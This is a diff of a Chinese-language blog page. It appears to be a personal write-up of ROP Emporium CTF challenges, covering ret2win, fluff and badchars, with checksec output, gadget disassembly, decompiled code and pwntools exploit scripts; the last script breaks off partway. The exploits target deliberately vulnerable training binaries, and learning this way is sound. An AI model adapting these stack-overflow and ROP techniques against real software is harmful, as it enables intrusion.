@@ -1,267 +1,697 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="尘埃落定">
+  <meta name="keywords" content="">
   
-  <title>ROP之ret2csu | 尘埃落定的空间站</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="以蒸米的一步一步学ROP之linux_x64篇level5为例来学习。 ret2csupivotfluffbadcharswrite4callmesplitret2win 保护措施来看，并没有很多安全措施 12345┌──(tiger㉿kali)-[~&#x2F;桌面]└─$ checksec --file&#x3D;.&#x2F;ret2win32RELRO           STACK CANARY      NX">
+    <meta name="description" content="以蒸米的一步一步学ROP之linux_x64篇level5为例来学习。 ret2csu参考https:&#x2F;&#x2F;lonmar.cn&#x2F;2022&#x2F;03&#x2F;09&#x2F;ret2csu&#x2F; pivotfluff题目说明  Working backwards Once we’ve employed our usual drills of checking protections and searching for inte">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ROP之ret2csu">
 <meta property="og:url" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/index.html">
 <meta property="og:site_name" content="尘埃落定的空间站">
-<meta property="og:description" content="以蒸米的一步一步学ROP之linux_x64篇level5为例来学习。 ret2csupivotfluffbadcharswrite4callmesplitret2win 保护措施来看，并没有很多安全措施 12345┌──(tiger㉿kali)-[~&#x2F;桌面]└─$ checksec --file&#x3D;.&#x2F;ret2win32RELRO           STACK CANARY      NX">
+<meta property="og:description" content="以蒸米的一步一步学ROP之linux_x64篇level5为例来学习。 ret2csu参考https:&#x2F;&#x2F;lonmar.cn&#x2F;2022&#x2F;03&#x2F;09&#x2F;ret2csu&#x2F; pivotfluff题目说明  Working backwards Once we’ve employed our usual drills of checking protections and searching for inte">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230105104930982.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230105102108346.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230103141013806.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230103141243696.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101122118666.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101123511596.png">
+<meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101124233579.png">
 <meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081632881.png">
 <meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230082028956.png">
 <meta property="og:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081146429.png">
 <meta property="article:published_time" content="2022-12-22T02:32:40.000Z">
-<meta property="article:modified_time" content="2022-12-30T00:31:25.947Z">
+<meta property="article:modified_time" content="2023-01-05T13:55:17.173Z">
 <meta property="article:author" content="尘埃落定">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081632881.png">
-  
-    <link rel="alternate" href="/atom.xml" title="尘埃落定的空间站" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230105104930982.png">
   
   
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+  
+  <title>ROP之ret2csu - 尘埃落定的空间站</title>
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
 <meta name="generator" content="Hexo 6.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">尘埃落定的空间站</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">Stay hungry, Stay foolish.</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-          <a class="main-nav-link" href="/about">About</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main"><article id="post-ROP之ret2csu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/12/22/ROP%E4%B9%8Bret2csu/" class="article-date">
-  <time class="dt-published" datetime="2022-12-22T02:32:40.000Z" itemprop="datePublished">2022-12-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      ROP之ret2csu
-    </h1>
   
 
-      </header>
+  <header>
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-	
-        <p>以蒸米的<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007406442">一步一步学ROP之linux_x64篇</a>level5为例来学习。</p>
-<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081632881.png" alt="image-20221230081632881"></p>
-<p>保护措施来看，并没有很多安全措施</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec --file=./ret2win32</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ./ret2win32</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>nm查看二进制信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nm ret2win|grep <span class="string">&#x27; t &#x27;</span></span><br><span class="line">08048490 t deregister_tm_clones</span><br><span class="line">08048510 t __do_global_dtors_aux</span><br><span class="line">08048540 t frame_dummy</span><br><span class="line">080485ad t pwnme</span><br><span class="line">080484d0 t register_tm_clones</span><br><span class="line"><span class="comment"># 此处有一个独特的函数</span></span><br><span class="line">0804862c t ret2win</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>r2</code>进行初步re，辅助查看</p>
-<p>pwnme函数中调用read，存在溢出点</p>
-<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230082028956.png" alt="image-20221230082028956"></p>
-<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081146429.png" alt="image-20221230081146429"></p>
-<p>思路很清晰，栈溢出并能ret到<code>ret2win</code>地址</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win_addr = <span class="number">0x804862c</span></span><br><span class="line"><span class="comment"># 可使用msf-pattern_create msf-pattern_offset来确定padding</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">p += <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">p += p32(ret2win_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;flag:\n&#x27;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以<a target="_blank" rel="noopener" href="https://ropemporium.com/">ROP系列</a>作为栈溢出学习点收尾，Stack over flow就告一段了。开启堆相关的内容😄</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/22/ROP%E4%B9%8Bret2csu/" data-id="clc8mkzpf0006js9y1std384b" data-title="ROP之ret2csu" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">后一篇</strong>
-      <div class="article-nav-title">ArmPwn初级</div>
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>尘埃落定的空间站</strong>
     </a>
-  
-</nav>
 
-  
-</article>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-
-
-</section>
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" rel="tag">黑技能</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" style="font-size: 10px;">黑技能</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
-          <li>
-            <a href="/2022/12/22/ROP%E4%B9%8Bret2csu/">ROP之ret2csu</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/">ArmPwn初级</a>
-          </li>
         
-          <li>
-            <a href="/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/">Fuzzing技术文章整理</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/30/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%A7%88/">车联网渗透测试一览</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/">Android抓包总结</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-        <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></br>
-All website licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></br>
-      
-      &copy; 2023 尘埃落定<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
 </nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ROP之ret2csu"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-22 10:32" pubdate>
+          2022年12月22日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.5k 字
+        
+      </span>
     
 
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          63 分钟
+        
+      </span>
+    
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ROP之ret2csu</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>以蒸米的<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007406442">一步一步学ROP之linux_x64篇</a>level5为例来学习。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://lonmar.cn/2022/03/09/ret2csu/">https://lonmar.cn/2022/03/09/ret2csu/</a></p>
+<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>题目说明</p>
+<blockquote>
+<p>Working backwards</p>
+<p>Once we’ve employed our usual drills of checking protections and searching for interesting symbols &amp; strings, we can think about what we’re trying to acheive and plan our chain. A solid approach is to work backwards: we’ll need a write gadget - for example <code>mov [reg], reg</code> or something equivalent - to make the actual write, so we can start there.</p>
+<p>Do it!</p>
+<p>There’s not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we’ll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. If you’re using a gadget finder like ropper, you may need to tell it to search for longer gadgets. <strong>As usual, you’ll need to call the <code>print_file()</code> function with a path to the flag as its only argument. Some useful(?) gadgets are available at the <code>questionableGadgets</code> symbol.</strong></p>
+</blockquote>
+<p>根据提示，查看<code>questionableGadgets</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">08048543 &lt;questionableGadgets&gt;:<br> 8048543:       89 e8                   mov    eax,ebp<br> 8048545:       bb ba ba ba b0          mov    ebx,0xb0bababa<br> 804854a:       c4 e2 62 f5 d0          pext   edx,ebx,eax<br> 804854f:       b8 ef be ad de          mov    eax,0xdeadbeef<br> 8048554:       c3                      ret<br> 8048555:       86 11                   xchg   BYTE PTR [ecx],dl<br> 8048557:       c3                      ret<br> 8048558:       59                      pop    ecx<br> 8048559:       0f c9                   bswap  ecx<br> 804855b:       c3                      ret<br> 804855c:       66 90                   xchg   ax,ax<br> 804855e:       66 90                   xchg   ax,ax<br><br></code></pre></td></tr></table></figure>
+
+<p><code>8048555:       86 11                   xchg   BYTE PTR [ecx],dl</code>该指令交换dl寄存器与ecx寄存器指向的值，相当于mov指令的改版</p>
+<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>有一些黑名单过滤的字符</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230105104930982.png" srcset="/img/loading.gif" lazyload alt="image-20230105104930982"></p>
+<p>对<code>badchars</code>做了处理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pwnme</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+0h] [ebp-38h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4h] [ebp-34h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+8h] [ebp-30h]</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [esp+10h] [ebp-28h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;badchars by ROP Emporium&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;x86\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(v4, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>  v1 = read(<span class="hljs-number">0</span>, v4, <span class="hljs-number">0x200</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v1; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">3</span>; ++j )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v4[i] == badcharacters[j] )<br>        v4[i] = <span class="hljs-number">-21</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>思路与write4差不多，<font color="red">不过需要首先处理输入字符的问题</font>。思路：使用<code>xor</code>处理字符，并利用<code>xor指令</code>还原字符</p>
+<p><strong>xor指令</strong></p>
+<blockquote>
+<p>XOR 指令在两个操作数的对应位之间进行（按位）逻辑异或（XOR）操作，并将结果存放在<strong>目标操作数</strong>中：</p>
+<p>XOR <strong>destination</strong>, source</p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./badchars32&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./badchars32&#x27;</span>)<br><br><span class="hljs-comment"># write strings</span><br><span class="hljs-comment"># 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="hljs-comment"># 0x0804854f : mov dword ptr [edi], esi ; ret</span><br><br><span class="hljs-comment"># 